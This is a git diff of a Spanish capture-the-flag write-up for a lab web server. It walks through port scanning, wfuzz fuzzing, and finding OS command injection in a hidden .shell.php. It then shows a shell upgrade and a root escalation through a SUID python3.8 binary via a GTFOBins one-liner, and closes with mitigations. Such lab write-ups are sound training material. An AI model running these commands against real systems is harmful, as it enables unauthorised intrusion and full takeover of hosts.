@@ -6,9 +6,12 @@ ___
 
 #### FASE RECONOCIMIENTO
 1. **Escaneo**:
-	* _Objetivo_:
+
+1.1 Primero comenzamos con el _Objetivo_:
+
 ```
-ap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]			PORT   STATE SERVICE VERSION                                                      
+nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
+			PORT   STATE SERVICE VERSION                                                      
 			22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
 			| ssh-hostkey:                                                                    
 			|   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)                    
@@ -21,49 +24,50 @@ ap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]			PORT   STATE SERV
 			|_  Supported Methods: OPTIONS HEAD GET POST                                      
 			MAC Address: CE:BF:D6:20:93:90 (Unknown)                                          
 			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                           
+```
 
-	*```
- _Web_:
-		- `whatweb [IP]`
-			- http://172.18.0.3 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.18.0.3], Title[The Walking Dead - CTF]                      
+1.2 Ahora que ya sabemos que hay una _Aplicación Web_:
+* `whatweb [IP]`
+	* `http://172.18.0.3 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.18.0.3], Title[The Walking Dead - CTF]                      
 
-		- `nikto -h [IP]`
-			+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
-			+ /hidden/: Directory indexing found.                      
-			+ /hidden/: This might be interesting.                     
+*`nikto -h [IP]`
+	+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+	+ /hidden/: Directory indexing found.                      
+	+ /hidden/: This might be interesting.                     
 
-2. **Enumeración**:
-	* _Web_:
-		* Directorios:
-			- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://172.18.0.3/FUZZ"`
-				- /hidden/	301				
-				
-		- Recursos (PHP-HTML-TXT)
-			- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u "http://172.18.0.3/FUZZ"`
-			- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.3/FUZZ.FUZ2Z"`
-				- /hidden/.shell.php    0   <==
-				- /index.html
-				- /backup.txt							200
-					- Error 403: Forbidden. Directory listing is disabled.	?
-					
-		- Recursos Ocultos:
-			- `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt -u "http://172.18.0.3/hidden/FUZZ"`   	X                                   
-			- `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://172.18.0.3/hidden/.FUZZ"`	X                                      
-			- 
+2. Ahora pasamos a la Sub-Fase de **Enumeración**:
+	
+2.1  de la _Web App_:
+* Directorios:
+	- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://172.18.0.3/FUZZ"`
+		- /hidden/	301				
+		
+- _Recursos (PHP-HTML-TXT)_
+	- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u "http://172.18.0.3/FUZZ"`
+	- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.3/FUZZ.FUZ2Z"`
+		- /hidden/.shell.php    0 bytes   <==
+		- /index.html
+		- /backup.txt							200
+			- Error 403: Forbidden. Directory listing is disabled.	?
 			
-		- Subdominios:
-		    * `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host. FUZZ.[dominio]" -u "http://[dominio|IP]"`
+- Recursos Ocultos:
+	- `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt -u "http://172.18.0.3/hidden/FUZZ"`   	X                                   
+	- `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://172.18.0.3/hidden/.FUZZ"`	X                                      
+	
+- Subdominios:
+	* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host. FUZZ.[dominio]" -u "http://[dominio|IP]"`
 						
 				
 3. **Busqueda de Vulnerabilidades:**
     * _Descargar Lógica PHPs_:
-		* `curl -O http://[IP]/hidden/.shell.php`   X	
+   		* Quizás podamos entender qué hace el script
+			* `curl -O http://[IP]/hidden/.shell.php`   X	
 		
 	* _Parámetros URL_:
 	    * Los más comunes:
 		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u "http://[IP]/hidden/.shell.php?FUZZ=1"	`    X
 		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../rockyou.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=1"`    X
-		- LFI:
+		- Buscamos posible LFI:
 		    1. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u "http://[IP]/hidden/.shell.php?FUZZ=FUZ2Z"`    X
 		
 		    2. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=FUZ2Z"`      X
@@ -71,6 +75,8 @@ ap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]			PORT   STATE SERV
 		* Otros:
 		    * `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://[IP]/hidden/.shell.php?FUZZ=id"`
                 * cmd 200   (Inyección de Comandos OS)  <==             
+
+___
 
 #### FASE EXPLOTACION
 * **Web:**
@@ -99,7 +105,9 @@ ap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]			PORT   STATE SERV
                 * python3 -c 'import pty;pty.spawn("/bin/bash")'
                 * tty
             * whoami ==> www-data
-            
+
+___
+		 
 #### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
 * Listar un poco a los usuarios:
     * ls -Ral /home
@@ -128,37 +136,34 @@ cat /usr/local/bin/wwwdata_vuln
 -e #!/bin/bash                 
 /bin/bash                      
 ```
+Viendo a simple vista, nos damos cuenta que en realidad este no es el camino. Debemos ir por otro lado.
 
-* Buscar Binarios SUID:
-    * find / -type f -perm -4000 2>/dev/null
-        /usr/lib/openssh/ssh-keysign               
-        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-        /usr/bin/man                               
-        /usr/bin/gpasswd                           
-        /usr/bin/mount                             
-        /usr/bin/umount                            
-        /usr/bin/chfn                              
-        /usr/bin/passwd                            
-        /usr/bin/su                                
-        /usr/bin/newgrp                            
-        /usr/bin/chsh                              
-        /usr/bin/python3.8 <===                        
-        /usr/bin/sudo                           
+**Buscar Binarios SUID:**
+Una de las primera cosas que hay que hacer para probar **Elevar Privilegios** es hallar estos binarios:
 
-* GTFOBins ==> `/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-* whoami ==> root
+* find / -type f -perm -4000 2>/dev/null
+	/usr/lib/openssh/ssh-keysign               
+	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+	/usr/bin/man                               
+	/usr/bin/gpasswd                           
+	/usr/bin/mount                             
+	/usr/bin/umount                            
+	/usr/bin/chfn                              
+	/usr/bin/passwd                            
+	/usr/bin/su                                
+	/usr/bin/newgrp                            
+	/usr/bin/chsh                              
+	/usr/bin/python3.8 <===                        
+	/usr/bin/sudo                           
+
+Vamos GTFOBins y terminamos corriendo:
+* `/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+
+`whoami` y somos `root`.
+
+___
 
 #### MITIGACIONES
 1. Sanear los Parámetros URL
 2. Robustecer las contraseñas
 3. Cuidado al otorgar permisos SUID a binarios explotables
-
----
-
-##### Lo que Aprendí en esta máquina:
-    * Un archivo PHP aunque no pese nada, no significa que no haga nada
-        * Puede importar la lógica de otro archivo
-        * Puede ser un Vector de Ataque
-    * Al fuzzear Parámetros URL:
-        * Debo darle un valor tmb, no sólo FUZZ=
-    * 
